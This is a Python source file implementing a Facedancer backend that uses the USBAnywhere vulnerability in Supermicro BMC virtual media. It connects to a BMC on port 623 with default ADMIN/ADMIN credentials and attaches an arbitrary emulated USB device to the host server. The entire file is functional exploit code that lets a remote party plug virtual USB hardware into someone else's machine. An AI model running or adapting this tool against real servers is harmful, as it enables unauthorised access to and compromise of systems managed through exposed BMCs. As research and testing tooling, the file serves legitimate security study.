import bitstruct
import hexdump
import os
import socket
import struct
import sys

from ..core import FacedancerApp
from ..USBDevice import USBDeviceRequest
from ..USBEndpoint import USBEndpoint


class UsbAnywhereApp(FacedancerApp):
    """
    Backend for using USBAnywhere vulnerability on Supermicro BMCs as FaceDancers.
    """

    STATE_DISCONNECTED = 0
    STATE_BEGIN_SETUP = 1
    STATE_DEV_SETUP_REQUEST_SENT = 2
    STATE_CONNECTED = 3

    TAG_ENDPOINT_TRANSFER = 0x00
    TAG_DEV_SETUP_REQUEST = 0x01
    TAG_DEV_SETUP_RESPONSE = 0x02
    TAG_PING_RESPONSE = 0x03
    TAG_PING_REQUEST = 0x04
    TAG_DETACH_DEVICE_REQUEST = 0x05
    TAG_DETACH_DEVICE_RESPONSE = 0x06
    TAG_EP_SETUP = 0x07
    TAG_STATUS_REQUEST = 0x08
    TAG_STATUS_RESPONSE = 0x09
    TAG_HTTP_PORT_REQUEST = 0x0A
    TAG_HTTP_PORT_RESPONSE = 0x0B
    TAG_ENDPOINT_TRANSFER2 = 0xFF

    TAG_DESCRIPTIONS = {
        TAG_PING_REQUEST: "Ping Request",
        TAG_PING_RESPONSE: "Ping Response",
        TAG_DEV_SETUP_REQUEST: "Device Setup Request",
        TAG_DEV_SETUP_RESPONSE: "Device Setup Response",
        TAG_EP_SETUP: "EP Setup",
        TAG_DETACH_DEVICE_REQUEST: "Detach Device Request",
        TAG_DETACH_DEVICE_RESPONSE: "Detach Device Response",
        TAG_ENDPOINT_TRANSFER: "Endpoint Data",
        TAG_ENDPOINT_TRANSFER2: "Endpoint Data and Start Transfer"
    }

    app_name = "USBAnywhere"
    app_num = 0x00  # This doesn't have any meaning for us.

    @classmethod
    def appropriate_for_environment(cls, backend_name):
        """
        Determines if the current environment seems appropriate
        for using the Supermicro Virtual Media backend.
        """

        if not backend_name:
            return False

        if not backend_name.startswith('usbanywhere'):
            return False

        (_, _, host) = backend_name.partition(':')
        if not host:
            sys.stderr.write(
                'ERROR: missing BMC hostname for usbanywhere backend.  Set BACKEND="usbanywhere:<bmc-host>".\n'
            )
            return False

        return True

    def __init__(self,
                 device=None,
                 verbose=0,
                 quirks=None,
                 port=623,
                 username='ADMIN',
                 password='ADMIN'):
        """
        Sets up a new USBAnywhere-backed Facedancer application.

        device: socket connected to BMC Virtual Media service.
        verbose: The verbosity level of the given application.
        """
        if device is None:
            backend_name = os.environ['BACKEND'].lower()
            (_, _, host) = backend_name.partition(':')
            device = socket.create_connection((host, port))
            device.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, True)

        self.username = username
        self.password = password
        self.state = self.STATE_DISCONNECTED

        FacedancerApp.__init__(self, device, verbose)

    def send_packet(self, tag, pdu_flags, dev_port, ep, payload):
        if self.verbose > 2:
            print(
                '<<<< Tag=0x{:02x} ({}), PduFlags=0x{:02x}, DevPort={:d}, Ep=0x{:02x}, Len={:d}'
                .format(tag, self.TAG_DESCRIPTIONS.get(tag, "Unknown"), pdu_flags,
                        dev_port, ep, len(payload)))
        if self.verbose > 3:
            hexdump.hexdump(payload)

        return self.device.sendall(
            struct.pack('<BBBBI', ep, pdu_flags, dev_port, tag, len(payload)) +
            bytes(payload))

    def recv_packet(self):
        header = self.device.recv(8)
        if not header:
            raise EOFError

        (ep, pdu_flags, dev_port, tag,
         payload_len) = struct.unpack_from('<BBBBI', header)

        if self.verbose > 2:
            print(
                '>>>> Tag=0x{:02x} ({}), PduFlags=0x{:02x}, DevPort={:d}, Ep=0x{:02x}, Len={:d}'
                .format(tag, self.TAG_DESCRIPTIONS.get(tag, "Unknown"), pdu_flags,
                        dev_port, ep, payload_len))

        if payload_len > 0:
            payload = b''
            while len(payload) < payload_len:
                payload += self.device.recv(payload_len - len(payload))
            if self.verbose > 3:
                hexdump.hexdump(payload)
        else:
            payload = None

        return (tag, pdu_flags, dev_port, ep, payload)

    def connect(self, usb_device, max_ep0_packet_size=64):
        """
        Prepares the FaceDancer app to connect to the target host and emulate
        a given device.

        usb_device: The USBDevice object that represents the device to be
            emulated.
        """
        self.connected_device = usb_device
        self.state = self.STATE_BEGIN_SETUP

    def disconnect(self):
        """ Disconnects the FaceDancer app from its target host. """
        self.send_packet(self.TAG_DETACH_DEVICE_REQUEST, 0x00, 0, 0x00, [])
        self.state = self.STATE_DISCONNECTED

    def ack_status_stage(self, blocking):
        pass

    def configured(self, configuration):
        """
        Callback that's issued when a USBDevice is configured, e.g. by the
        SET_CONFIGRUATION request. Allows us to apply the new configuration.

        configuration: The configruation applied by the SET_CONFIG request.
        """
        self.ep_type = {}
        for intf in configuration.interfaces:
            for ep in intf.endpoints:
                if ep.transfer_type == USBEndpoint.transfer_type_bulk and ep.direction == USBEndpoint.direction_out:
                    self.ep_type[ep.number] = 1
                elif ep.transfer_type == USBEndpoint.transfer_type_bulk and ep.direction == USBEndpoint.direction_in:
                    self.ep_type[ep.number] = 2
                elif ep.transfer_type == USBEndpoint.transfer_type_interrupt and ep.direction == USBEndpoint.direction_in:
                    self.ep_type[ep.number] = 3
                else:
                    print(
                        'USBAnywhere: endpoint {} has unsupported type/direction'
                        .format(ep.number),
                        file=sys.stderr)
                    self.ep_type[ep.number] = 0

        flags = bitstruct.pack_dict(
            'b1 b1 p2 u3 b1 u4 p20', [
                'username_is_session_id', 'check_auth_only', 'desired_port',
                'allocate_port', 'unknown1'
            ], {
                'unknown1': 0x3,
                'username_is_session_id': False,
                'check_auth_only': False,
                'desired_port': 2,
                'allocate_port': 1
            })

        setup_payload = struct.pack('<16s20sI', bytes(self.username, 'ascii'),
                                    bytes(self.password, 'ascii'),
                                    0xE7150000) + flags

        descriptors = list()

        device_descirptor = self.connected_device.get_descriptor()
        device_descirptor[14] = 0
        device_descirptor[15] = 0
        device_descirptor[16] = 0

        descriptors.insert(0, device_descirptor)
        descriptors.insert(1, configuration.get_descriptor())
        descriptors.insert(
            2, self.connected_device.handle_get_string_descriptor_request(0))
        descriptors.insert(
            3,
            self.connected_device.handle_get_string_descriptor_request(
                self.connected_device.manufacturer_string_id))
        descriptors.insert(
            4,
            self.connected_device.handle_get_string_descriptor_request(
                self.connected_device.product_string_id))
        descriptors.insert(
            5,
            self.connected_device.handle_get_string_descriptor_request(
                self.connected_device.serial_number_string_id))
        descriptors.insert(6, bytes([0x00]))
        # Device Qualifier
        descriptors.insert(
            7,
            bytes([0x0a, 0x06, 0x00, 0x02, 0x00, 0x00, 0x00, 0x40, 0x01,
                   0x00]))

        for descriptor in descriptors:
            setup_payload += struct.pack('<B', len(descriptor)) + descriptor

        self.send_packet(self.TAG_DEV_SETUP_REQUEST, 0x00, 0, 0x00,
                         setup_payload)
        self.state = self.STATE_DEV_SETUP_REQUEST_SENT

    def send_on_endpoint(self, ep_num, data, blocking):
        self.send_packet(self.TAG_ENDPOINT_TRANSFER2, 0x00, 1, (self.ep_type[ep_num] << 4 | ep_num), data)

    def service_irqs(self):
        """
        Core routine of the Facedancer execution/event loop. Continuously monitors the
        FaceDancer's execution status, and reacts as events occur.
        """
        if self.state == self.STATE_BEGIN_SETUP:
            # Simluate a SET_CONFIGURATION request
            config_request = USBDeviceRequest(
                [0x00, 9, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00])
            self.connected_device.handle_set_configuration_request(
                config_request)
        else:
            if self.state == self.STATE_CONNECTED:
                for intf in self.connected_device.configuration.interfaces:
                    for ep in intf.endpoints:
                        if ep.direction == USBEndpoint.direction_in:
                            self.connected_device.handle_buffer_available(ep.number)

            try:
                self.device.settimeout(0.1)
                (tag, pdu_flags, dev_port, ep, payload) = self.recv_packet()
                self.device.settimeout(None)

                if tag == self.TAG_PING_REQUEST:
                    self.send_packet(self.TAG_PING_REQUEST, 0x00, 0, 0x00, [])
                elif self.state == self.STATE_DEV_SETUP_REQUEST_SENT and tag == self.TAG_DEV_SETUP_RESPONSE:
                    payload = bytearray([0x06, len(self.ep_type.keys())])
                    for (ep_num, ep_type) in self.ep_type.items():
                        payload += bytes([ep_num, ep_type << 4])

                    self.send_packet(
                        self.TAG_EP_SETUP,
                        0x00,
                        0,
                        0x00,
                        payload)
                    self.state = self.STATE_CONNECTED
                elif self.state == self.STATE_CONNECTED and tag == self.TAG_ENDPOINT_TRANSFER and payload:
                    ep_num = ep & 0x0F

                    self.connected_device.handle_data_available(ep_num, payload)

            except socket.timeout:
                pass
            except EOFError:
                print("Remote closed connection", file=sys.stderr)
                sys.exit(1)